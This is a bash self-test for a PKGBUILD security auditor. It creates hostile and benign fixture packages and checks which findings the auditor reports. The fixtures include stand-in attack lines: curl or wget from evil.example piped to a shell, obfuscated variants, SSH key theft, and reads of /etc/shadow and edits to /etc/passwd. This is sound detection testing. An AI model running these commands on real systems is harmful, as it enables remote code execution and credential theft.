#!/usr/bin/env bash
# Offline self-test for audit.py.
# One hostile package must block, one ordinary package must pass, and the
# real-world patterns that once produced false CLEAN/false HIGH must stay fixed.
set -uo pipefail

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT
fail=0

fail_msg() { echo "FAIL: $*"; fail=1; }

run() {  # fixture [audit args...]
  local d=$1
  shift
  python3 "$here/audit.py" --pkgbuild "$tmp/$d" --json "$tmp/$d.json" "$@" \
    > "$tmp/$d.txt" 2>&1
}

want_code() {  # fixture expected-exit
  run "$1"
  local rc=$?
  [ "$rc" = "$2" ] || { fail_msg "$1 exit=$rc want=$2"; cat "$tmp/$1.txt"; }
}

want_finding() {
  python3 - "$tmp/$1.json" "$2" <<'PY' || { fail_msg "$1 missing finding $2"; cat "$tmp/$1.txt"; }
import json, sys
codes = {f["code"] for f in json.load(open(sys.argv[1]))["findings"]}
raise SystemExit(0 if sys.argv[2] in codes else 1)
PY
}

no_finding() {
  python3 - "$tmp/$1.json" "$2" <<'PY' && { fail_msg "$1 has unwanted finding $2"; cat "$tmp/$1.txt"; }
import json, sys
codes = {f["code"] for f in json.load(open(sys.argv[1]))["findings"]}
raise SystemExit(0 if sys.argv[2] in codes else 1)
PY
}

want_text() {
  grep -q "$2" "$tmp/$1.txt" || { fail_msg "$1 missing text $2"; cat "$tmp/$1.txt"; }
}

json_clean() {  # no HIGH/MEDIUM
  python3 - "$tmp/$1.json" <<'PY' || { fail_msg "$1 produced HIGH/MEDIUM"; cat "$tmp/$1.txt"; }
import json, sys
bad = [f for f in json.load(open(sys.argv[1]))["findings"]
       if f["severity"] in ("HIGH", "MEDIUM")]
raise SystemExit(1 if bad else 0)
PY
}

json_source_scheme() {  # fixture index expected-scheme
  python3 - "$tmp/$1.json" "$2" "$3" <<'PY' || { fail_msg "$1 source $2 is not $3"; cat "$tmp/$1.txt"; }
import json, sys
s = json.load(open(sys.argv[1]))["sources"][int(sys.argv[2])]
raise SystemExit(0 if s["scheme"] == sys.argv[3] and s["resolved"] else 1)
PY
}

mk() { mkdir -p "$tmp/$1"; cat > "$tmp/$1/PKGBUILD"; }

# --- hostile: every hard block in one package -------------------------------
mk evil <<'PKG'
pkgname=evil
pkgver=1.0
pkgrel=1
pkgdesc="fixture"
arch=('x86_64')
url="https://evil.example"
license=('unknown')
source=("http://evil.example/x.tar.gz"
        "k.sh::$(curl -s https://evil.example/k.sh)")
sha256sums=('SKIP'
            'deadbeef')
install=evil.install
build() {
  curl -s https://evil.example/p | bash
  eval "$(echo aGVsbG8= | base64 -d)"
  sudo chmod 4755 "$pkgdir/usr/bin/x"
  cat ~/.ssh/id_rsa > "$pkgdir/key"
}
package() { install -Dm755 x "$pkgdir/usr/bin/x"; }
PKG
cat > "$tmp/evil/evil.install" <<'INST'
post_install() {
  curl -s http://evil.example/i.sh | sh
}
INST
want_code evil 2
for want in dynamic-source insecure-scheme skip-checksum malformed-checksum \
            net-fetch pipe-to-shell privilege credential-access; do
  want_finding evil "$want"
done

# --- ordinary package --------------------------------------------------------
mk ok <<'PKG'
pkgname=ok
pkgver=1.0
pkgrel=1
pkgdesc="fixture"
arch=('x86_64')
url="https://example.org/ok"
license=('MIT')
source=("https://example.org/ok-$pkgver.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package() {
  install -Dm644 COPYING "$pkgdir/usr/share/licenses/$pkgname/COPYING"
}
PKG
want_code ok 0
json_clean ok

# --- `$url`/`$pkgver` must stay remote, not become "local" -------------------
mk var_source <<'PKG'
pkgname=var_source
pkgver=2.1
pkgrel=1
arch=('x86_64')
url="https://example.org/proj"
license=('MIT')
source=("$pkgname-$pkgver.tar.gz::$url/releases/download/v$pkgver/$pkgname-$pkgver.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package(){ :; }
PKG
want_code var_source 0
json_source_scheme var_source 0 https
no_finding var_source local-source
no_finding var_source source-unresolved

# --- inline comments are not executed ---------------------------------------
mk inline_comment <<'PKG'
pkgname=inline_comment
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package(){ install -Dm644 x "$pkgdir/x" # curl http://x | sh is documented in README
}
PKG
want_code inline_comment 0
no_finding inline_comment net-fetch
no_finding inline_comment pipe-to-shell

# --- source+= is a second array, not a checksum desync ----------------------
mk append_source <<'PKG'
pkgname=append_source
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
source+=("https://example.org/b.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
            'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package(){ :; }
PKG
want_code append_source 0
no_finding append_source checksum-count-mismatch
json_clean append_source

# --- `function name {` bodies are still build-time code ---------------------
mk fn_keyword <<'PKG'
pkgname=fn_keyword
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
function build {
  wget -qO- https://evil.example/p | sh
}
package(){ :; }
PKG
want_code fn_keyword 2
want_finding fn_keyword net-fetch
want_finding fn_keyword pipe-to-shell

# --- top-level substitution runs when the PKGBUILD is sourced ---------------
mk top_subst <<'PKG'
pkgname=top_subst
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
_x=$(curl -fsSL http://evil.example/i | sh)
source=("https://example.org/a.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package(){ :; }
PKG
want_code top_subst 2
want_finding top_subst dynamic-shell

mk dep_subst <<'PKG'
pkgname=dep_subst
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
depends=($(curl -fsSL http://evil.example/deps | sh))
source=("https://example.org/a.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package(){ :; }
PKG
want_code dep_subst 2
want_finding dep_subst dynamic-shell

# --- .install runs as root: allowlisted commands are still visible ----------
mk install_root <<'PKG'
pkgname=install_root
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
install=install_root.install
package(){ :; }
PKG
cat > "$tmp/install_root/install_root.install" <<'INST'
post_install() {
  cat /etc/shadow > /tmp/x
  sed -i 's/^root:/root2:/' /etc/passwd
}
INST
want_code install_root 0
want_finding install_root install-script-root-write
want_finding install_root install-script-command

# --- .SRCINFO drift ---------------------------------------------------------
mk srcinfo_drift <<'PKG'
pkgname=srcinfo_drift
pkgver=1.0
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package(){ :; }
PKG
cat > "$tmp/srcinfo_drift/.SRCINFO" <<'SRC'
pkgbase = srcinfo_drift
	pkgver = 1.0
	pkgrel = 1
	source = https://evil.example/b.tar.gz
	sha256sums = 0000000000000000000000000000000000000000000000000000000000000000
SRC
want_code srcinfo_drift 0
want_finding srcinfo_drift srcinfo-stale

# --- a signature source without validpgpkeys is never checked ---------------
mk sig_no_key <<'PKG'
pkgname=sig_no_key
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz" "https://example.org/a.tar.gz.sig")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' 'SKIP')
package(){ :; }
PKG
want_code sig_no_key 0
want_finding sig_no_key signature-not-verified

# --- local snapshot files are hashed against the declared sums --------------
mk local_mismatch <<'PKG'
pkgname=local_mismatch
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=('helper.sh')
sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')
package(){ install -Dm755 helper.sh "$pkgdir/usr/bin/helper"; }
PKG
printf 'echo hi\n' > "$tmp/local_mismatch/helper.sh"
want_code local_mismatch 2
want_finding local_mismatch checksum-mismatch

# --- an absolute local source is not read from the host ---------------------
mk escape <<'PKG'
pkgname=escape
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=('/etc/hostname')
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package(){ :; }
PKG
want_code escape 0
want_finding escape source-unverified
no_finding escape local-source

# --- quoted source words and brace alternatives are one source each ---------
mk quoted_source <<'PKG'
pkgname=quoted_source
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("${pkgname}-${pkgver}.tar.gz"::"https://example.org/${pkgname}-${pkgver}.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package(){ :; }
PKG
want_code quoted_source 0
json_source_scheme quoted_source 0 https
no_finding quoted_source local-source

mk brace_source <<'PKG'
pkgname=brace_source
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/thing-${pkgver}.tar.gz"{,.sig})
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
            'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
validpgpkeys=('3FEF9748469ADBE15DA7CA80AC2D62742012EA22')
package(){ :; }
PKG
want_code brace_source 0
no_finding brace_source checksum-count-mismatch
no_finding brace_source signature-not-verified

# --- printed instructions are not executed commands -------------------------
mk echo_warning <<'PKG'
pkgname=echo_warning
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
install=echo_warning.install
package(){
  printf "%b" "Enable it with: systemctl enable --now demo\n"
}
PKG
cat > "$tmp/echo_warning/echo_warning.install" <<'INST'
post_install() {
  echo "Execute 'sudo systemctl enable demo' in a terminal."
}
INST
want_code echo_warning 0
no_finding echo_warning privilege
no_finding echo_warning persistence

# --- local-only package with a correct sum is fully verified ----------------
mkdir -p "$tmp/local_ok"
printf 'echo ok\n' > "$tmp/local_ok/helper.sh"
local_sum=$(sha256sum "$tmp/local_ok/helper.sh" | cut -d' ' -f1)
cat > "$tmp/local_ok/PKGBUILD" <<PKG
pkgname=local_ok
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=('helper.sh')
sha256sums=('$local_sum')
package(){ install -Dm755 helper.sh "\$pkgdir/usr/bin/helper"; }
PKG
want_code local_ok 0
python3 - "$tmp/local_ok.json" <<'PY' || { fail_msg "local_ok is not fully verified"; cat "$tmp/local_ok.txt"; }
import json, sys
r = json.load(open(sys.argv[1]))
raise SystemExit(0 if r["sources_verified"] and r["verdict"] == "CLEAN (sources verified)" else 1)
PY

# --- regression fixtures for the 2026-11 audit review -----------------------
SUMH='e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'

# Provenance must compare SHA-256 with SHA-256, whatever algorithm the PKGBUILD declares.
python3 - "$here/audit.py" <<'PY' || { fail_msg "provenance cross-algorithm comparison"; }
import importlib.util, sys
spec = importlib.util.spec_from_file_location("audit", sys.argv[1])
a = importlib.util.module_from_spec(spec)
sys.modules["audit"] = a
spec.loader.exec_module(a)
r = a.Report(package="demo")
src = a.Source(raw="https://github.com/o/r/releases/download/v1/x.tar.gz",
               url="https://github.com/o/r/releases/download/v1/x.tar.gz",
               line=6, scheme="https", vcs=False, sig=False, patch=False)
src.resolved = src.url
sha512, sha256 = "c" * 128, "b" * 64
src.sums = {"sha512sums": sha512}
r.sources = [src]
a._digest_url_multi = lambda url, algs, cache_path=None: {x: (sha512 if x == "sha512sums" else sha256) for x in algs}
a.upstream_sums = lambda url: ({"x.tar.gz": sha256}, "")
a.verify_sources(r, {}, "/tmp", remote=True)
raise SystemExit(0 if src.provenance == "upstream SHA256SUMS matches" and not r.findings else 1)
PY

# Indexed assignments must override the literal array, not be silently ignored.
mk indexed <<PKG
pkgname=indexed
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://good.example/a.tar.gz")
sha256sums=('$SUMH')
source[0]="https://evil.example/a.tar.gz"
sha256sums[0]='SKIP'
package(){ :; }
PKG
want_code indexed 2
want_finding indexed skip-checksum
no_finding indexed top-level-command
python3 - "$tmp/indexed.json" <<'PY' || { fail_msg "indexed assignment not applied"; cat "$tmp/indexed.txt"; }
import json, sys
s = json.load(open(sys.argv[1]))["sources"][0]
raise SystemExit(0 if s["resolved"] == "https://evil.example/a.tar.gz"
                 and s["sums"]["sha256sums"] == "SKIP" else 1)
PY

# Conditional appends make the count unknowable; that is INFO, not a HIGH block.
mk conditional <<PKG
pkgname=conditional
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz" "https://example.org/b.tar.gz")
sha256sums=('$SUMH' '$SUMH')
if true; then
  source+=("https://example.org/c.tar.gz")
fi
package(){ :; }
PKG
want_code conditional 0
want_finding conditional checksum-count-unresolved
no_finding conditional checksum-count-mismatch

# Chained commands after echo/printf must not be exempted whole.
mk echo_chain <<PKG
pkgname=echo_chain
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
build() { echo ok; curl -s http://evil.example/x | sh; }
package(){ :; }
PKG
want_code echo_chain 2
want_finding echo_chain net-fetch
want_finding echo_chain pipe-to-shell

# Scalar source/checksum declarations are valid bash and must still be reviewed.
mk scalar_source <<'PKG'
pkgname=scalar_source
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source="http://evil.example/x.tar.gz"
sha256sums="0000000000000000000000000000000000000000000000000000000000000000"
package(){ :; }
PKG
want_code scalar_source 2
want_finding scalar_source insecure-scheme

# A scalar validpgpkeys pins the key just like the array form.
mk scalar_key <<PKG
pkgname=scalar_key
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz" "a.sig::https://example.org/a.tar.gz.gpg")
sha256sums=('$SUMH' 'SKIP')
validpgpkeys=E1096BCBFF6D418796DE78515384CE82BA52C83A
package(){ :; }
PKG
want_code scalar_key 0
no_finding scalar_key signature-not-verified

# A source array assigned only inside a called function is still a gap.
mk fn_source <<'PKG'
pkgname=fn_source
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
_helper() {
  source=("https://evil.example/x.tar.gz")
  sha256sums=('SKIP')
}
_helper
package(){ :; }
PKG
want_code fn_source 0
want_finding fn_source top-level-command
want_finding fn_source array-index-unresolved
want_text fn_source "REVIEW"

# A command after a top-level assignment on the same line still runs.
mk top_chain <<PKG
pkgname=top_chain
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
x=1; curl -s http://evil.example/x | sh
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
package(){ :; }
PKG
want_code top_chain 2
want_finding top_chain net-fetch

# A non-rule command chained after an assignment is still top-level code.
mk top_chain_plain <<PKG
pkgname=top_chain_plain
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
x=1; ./shipped-payload.sh
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
package(){ :; }
PKG
want_code top_chain_plain 0
want_finding top_chain_plain top-level-command

# A command after a function's closing brace on the same line still runs.
mk fnline_chain <<PKG
pkgname=fnline_chain
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
build(){ :; }; curl -s http://evil.example/x | sh
package(){ :; }
PKG
want_code fnline_chain 2
want_finding fnline_chain net-fetch

# `| /bin/sh` and sourcing a local script are executable payloads.
mk local_exec <<PKG
pkgname=local_exec
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
build() { cat helper.sh | /bin/sh; source ./helper.sh; }
package(){ :; }
PKG
want_code local_exec 2
want_finding local_exec pipe-to-shell
want_finding local_exec script-exec

# Hyphenated bash function names are bodies, not top-level statements.
mk hyphen_fn <<PKG
pkgname=hyphen_fn
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
build(){ :; }
_package-extra() { curl -s http://evil.example/x | sh; }
package(){ :; }
PKG
want_code hyphen_fn 2
want_finding hyphen_fn net-fetch
no_finding hyphen_fn top-level-command

# `.gpg` is not a signature to makepkg: SKIP must block, not be exempt.
mk gpg_not_sig <<PKG
pkgname=gpg_not_sig
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz" "https://example.org/a.tar.gz.gpg")
sha256sums=('$SUMH' 'SKIP')
validpgpkeys=('E1096BCBFF6D418796DE78515384CE82BA52C83A')
package(){ :; }
PKG
want_code gpg_not_sig 2
want_finding gpg_not_sig skip-checksum

# A renamed `.sig` is a signature to makepkg: SKIP is exempt, not a HIGH.
mk sig_renamed <<PKG
pkgname=sig_renamed
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz" "a.sig::https://example.org/a.tar.gz.gpg")
sha256sums=('$SUMH' 'SKIP')
validpgpkeys=('E1096BCBFF6D418796DE78515384CE82BA52C83A')
package(){ :; }
PKG
want_code sig_renamed 0
no_finding sig_renamed skip-checksum
no_finding sig_renamed signature-not-verified

# A local .sig is still a snapshot file; with SKIP it is exempt, not a gap.
mkdir -p "$tmp/local_sig"
printf 'data\n' > "$tmp/local_sig/a.tar.gz"
: > "$tmp/local_sig/a.tar.gz.sig"
local_sig_sum=$(sha256sum "$tmp/local_sig/a.tar.gz" | cut -d' ' -f1)
cat > "$tmp/local_sig/PKGBUILD" <<PKG
pkgname=local_sig
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=('a.tar.gz' 'a.tar.gz.sig')
sha256sums=('$local_sig_sum' 'SKIP')
validpgpkeys=('E1096BCBFF6D418796DE78515384CE82BA52C83A')
package(){ :; }
PKG
want_code local_sig 0
python3 - "$tmp/local_sig.json" <<'PY' || { fail_msg "local .sig with SKIP is not exempt"; cat "$tmp/local_sig.txt"; }
import json, sys
r = json.load(open(sys.argv[1]))
raise SystemExit(0 if r["sources_verified"]
                 and r["verdict"] == "CLEAN (checksums verified; signatures not checked)" else 1)
PY

# A prebuilt payload is detected structurally, not only from a `-bin` name.
mk prebuilt_deb <<PKG
pkgname=prebuilt_deb
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/app.deb")
sha256sums=('$SUMH')
package() { bsdtar -xf data.tar.xz -C "\$pkgdir/"; }
PKG
want_code prebuilt_deb 0
want_finding prebuilt_deb prebuilt-payload

# A real build() means a source package even if one optional source is a binary.
mk source_pkg <<PKG
pkgname=source_pkg
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz" "https://example.org/vendor.run")
sha256sums=('$SUMH' '$SUMH')
build() { make; }
package() { make DESTDIR="\$pkgdir" install; }
PKG
want_code source_pkg 0
no_finding source_pkg prebuilt-payload

# Idiomatic top-level no-op assignments are not top-level commands.
mk top_assign <<PKG
pkgname=top_assign
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
: "\${_opt:=yes}"
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
package(){ :; }
PKG
want_code top_assign 0
no_finding top_assign top-level-command

# Split-package .SRCINFO arrays are not compared by flattening.
mk split_srcinfo <<PKG
pkgbase=split_srcinfo
pkgname=('split-a' 'split-b')
pkgver=1
pkgrel=1
arch=('x86_64')
url="https://example.org"
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
depends=('a')
package_split-a() { depends=('b'); }
package_split-b() { depends=('c'); }
PKG
cat > "$tmp/split_srcinfo/.SRCINFO" <<'SRC'
pkgbase = split_srcinfo
    pkgver = 1
    pkgrel = 1
    arch = x86_64
    license = MIT
    source = https://example.org/a.tar.gz
    sha256sums = e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
    depends = a

pkgname = split-a
    depends = b

pkgname = split-b
    depends = c
SRC
want_code split_srcinfo 0
no_finding split_srcinfo srcinfo-stale
want_finding split_srcinfo srcinfo-unchecked

# A per-subpackage `custom` license does not make the whole package unknown.
mk split_license <<PKG
pkgbase=split_license
pkgname=('split-a' 'split-b')
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
package_split-a() { :; }
package_split-b() { license=('custom'); }
PKG
want_code split_license 0
no_finding split_license license-unknown

# --- numeric SUID in a shipped local build script ---------------------------
mkdir -p "$tmp/local_suid"
cat > "$tmp/local_suid/port.sh" <<'SH'
#!/bin/bash
chmod 4755 "$pkgdir/usr/bin/x"
exec /opt/x --no-sandbox "$@"
SH
local_suid_sum=$(sha256sum "$tmp/local_suid/port.sh" | cut -d' ' -f1)
cat > "$tmp/local_suid/PKGBUILD" <<PKG
pkgname=local_suid
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=('port.sh')
sha256sums=('$local_suid_sum')
build(){ bash port.sh; }
package(){ :; }
PKG
want_code local_suid 0
want_finding local_suid privilege
want_finding local_suid sandbox-weakened
no_finding local_suid checksum-mismatch

# --- assignments inside functions do not define the build-time array --------
mkdir -p "$tmp/scoped_skip"
printf 'EVILPAYLOAD' > "$tmp/scoped_skip/evil.tar.gz"
scoped_sum=$(sha256sum "$tmp/scoped_skip/evil.tar.gz" | cut -d' ' -f1)
cat > "$tmp/scoped_skip/PKGBUILD" <<PKG
pkgname=scoped_skip
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=('evil.tar.gz')
sha256sums=('SKIP')
prepare() {
  sha256sums[0]='$scoped_sum'
}
build(){ :; }
package(){ :; }
PKG
want_code scoped_skip 2
want_finding scoped_skip skip-checksum
want_finding scoped_skip array-index-unresolved

# A subshell assignment does not change the parent's checksum array either.
mkdir -p "$tmp/subshell"
printf 'EVILPAYLOAD' > "$tmp/subshell/evil.tar.gz"
subshell_sum=$(sha256sum "$tmp/subshell/evil.tar.gz" | cut -d' ' -f1)
cat > "$tmp/subshell/PKGBUILD" <<PKG
pkgname=subshell
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=('evil.tar.gz')
sha256sums=('SKIP')
(
  sha256sums[0]='$subshell_sum'
)
package(){ :; }
PKG
want_code subshell 2
want_finding subshell skip-checksum
want_finding subshell array-index-unresolved

# --- `git+http://` is plaintext transport even though it is a VCS source ----
mk git_http <<PKG
pkgname=git_http
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("git+http://evil.example/x.git")
sha256sums=('SKIP')
package(){ :; }
PKG
want_code git_http 2
want_finding git_http insecure-scheme

# --- top-level .install code runs as root when pacman sources the file ------
mkdir -p "$tmp/inst_top"
cat > "$tmp/inst_top/inst_top.install" <<'INST'
curl -fsSL http://evil.example/i.sh | sh
post_install() { :; }
INST
cat > "$tmp/inst_top/PKGBUILD" <<'PKG'
pkgname=inst_top
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
install=inst_top.install
source=()
sha256sums=()
package(){ :; }
PKG
want_code inst_top 2
want_finding inst_top net-fetch
want_finding inst_top pipe-to-shell

# --- a declared install script in a subdirectory is still scanned -----------
mkdir -p "$tmp/inst_subdir/hooks"
cat > "$tmp/inst_subdir/hooks/evil.install" <<'INST'
post_install() { curl -fsSL http://evil.example/i.sh | sh; }
INST
cat > "$tmp/inst_subdir/PKGBUILD" <<'PKG'
pkgname=inst_subdir
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
install=hooks/evil.install
source=()
sha256sums=()
package(){ :; }
PKG
want_code inst_subdir 2
want_finding inst_subdir net-fetch

# --- a comment between () and { does not hide the scriptlet body ------------
mkdir -p "$tmp/inst_brace"
cat > "$tmp/inst_brace/inst_brace.install" <<'INST'
post_install() # runs as root
{
  curl -fsSL http://evil.example/i.sh | sh
}
INST
cat > "$tmp/inst_brace/PKGBUILD" <<'PKG'
pkgname=inst_brace
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
install=inst_brace.install
source=()
sha256sums=()
package(){ :; }
PKG
want_code inst_brace 2
want_finding inst_brace pipe-to-shell

# --- root writes are found even behind an allowlisted shell keyword ---------
mkdir -p "$tmp/inst_if"
cat > "$tmp/inst_if/inst_if.install" <<'INST'
post_install() {
  if [ -d /usr/lib ]; then cp /tmp/x /usr/lib/x; fi
}
INST
cat > "$tmp/inst_if/PKGBUILD" <<'PKG'
pkgname=inst_if
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
install=inst_if.install
source=()
sha256sums=()
package(){ :; }
PKG
want_code inst_if 0
want_finding inst_if install-script-root-write

# --- backslash obfuscation is normalized before rule matching ---------------
mk obfuscated <<PKG
pkgname=obfuscated
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
build() { c\\url -s https://evil.example/x | b\\ash; }
package(){ :; }
PKG
want_code obfuscated 2
want_finding obfuscated net-fetch
want_finding obfuscated pipe-to-shell

# --- quoted instructions are inert prose, not a build-time pipeline ---------
mk quoted_msg <<PKG
pkgname=quoted_msg
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
package() { msg "Install the helper with: curl -fsSL https://example.org/i.sh | bash"; }
PKG
want_code quoted_msg 0
no_finding quoted_msg net-fetch
no_finding quoted_msg pipe-to-shell

# --- array-reference expansion is unresolved, not a count mismatch ----------
mk array_ref <<PKG
pkgname=array_ref
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
_files=('a.tar.gz' 'b.tar.gz')
_dlpath="https://example.org/fonts"
source=("\${_files[@]/#/\$_dlpath/}")
sha256sums=('$SUMH' '$SUMH')
package(){ :; }
PKG
want_code array_ref 0
no_finding array_ref checksum-count-mismatch
want_finding array_ref source-unresolved
want_finding array_ref checksum-count-unresolved

# --- SUID bits installed with `install -m` are a privilege finding ----------
mk suid_install <<PKG
pkgname=suid_install
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('$SUMH')
package() { install -Dm4755 chrome-sandbox "\$pkgdir/usr/lib/x/chrome-sandbox"; }
PKG
want_code suid_install 0
want_finding suid_install privilege

# --- SHA-384 is a valid makepkg checksum algorithm -------------------------
sha384_sum=$(printf 'a%.0s' {1..96})
mk sha384 <<PKG
pkgname=sha384
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha384sums=('$sha384_sum')
package(){ :; }
PKG
want_code sha384 0
no_finding sha384 missing-checksums

# --- launcher sandbox flags are a finding; a comment is not -----------------
mk sandbox_wrapper <<'PKG'
pkgname=sandbox_wrapper
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package(){
  install -Dm755 /dev/stdin "$pkgdir/usr/bin/demo" <<'LAUNCHER'
#!/bin/sh
exec /opt/demo --no-sandbox "$@"
LAUNCHER
}
PKG
want_code sandbox_wrapper 0
want_finding sandbox_wrapper sandbox-weakened

mk sandbox_comment <<'PKG'
pkgname=sandbox_comment
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.org/a.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
package(){
  # never use --no-sandbox here
  :
}
PKG
want_code sandbox_comment 0
no_finding sandbox_comment sandbox-weakened

# --- image assets collapse to one INFO line ---------------------------------
mkdir -p "$tmp/icon_assets"
printf 'x' > "$tmp/icon_assets/icon1.png"
printf 'y' > "$tmp/icon_assets/icon2.png"
icon1_sum=$(sha256sum "$tmp/icon_assets/icon1.png" | cut -d' ' -f1)
icon2_sum=$(sha256sum "$tmp/icon_assets/icon2.png" | cut -d' ' -f1)
cat > "$tmp/icon_assets/PKGBUILD" <<PKG
pkgname=icon_assets
pkgver=1
pkgrel=1
arch=('x86_64')
license=('MIT')
source=('icon1.png' 'icon2.png')
sha256sums=('$icon1_sum' '$icon2_sum')
package(){ :; }
PKG
want_code icon_assets 0
want_text icon_assets "image assets"
[ "$(grep -c 'local-source' "$tmp/icon_assets.txt")" = 1 ] \
  || { fail_msg "icon_assets did not collapse local-source INFO"; cat "$tmp/icon_assets.txt"; }

# --- npm provenance: integrity/shasum/signature status ----------------------
python3 - "$here/audit.py" <<'PY' || { fail_msg "npm provenance match"; }
import base64, importlib.util, sys
spec = importlib.util.spec_from_file_location("audit", sys.argv[1])
a = importlib.util.module_from_spec(spec)
sys.modules["audit"] = a
spec.loader.exec_module(a)
url = "https://registry.npmjs.org/@scope/pkg/-/pkg-1.0.0.tgz"
sha256, sha512hex, sha1hex = "b" * 64, "c" * 128, "d" * 40
integrity = "sha512-" + base64.b64encode(bytes.fromhex(sha512hex)).decode()
r = a.Report(package="demo")
src = a.Source(raw=url, url=url, line=7, scheme="https", vcs=False, sig=False, patch=False)
src.resolved = url
src.filename = "pkg-1.0.0.tgz"
src.sums = {"sha256sums": sha256}
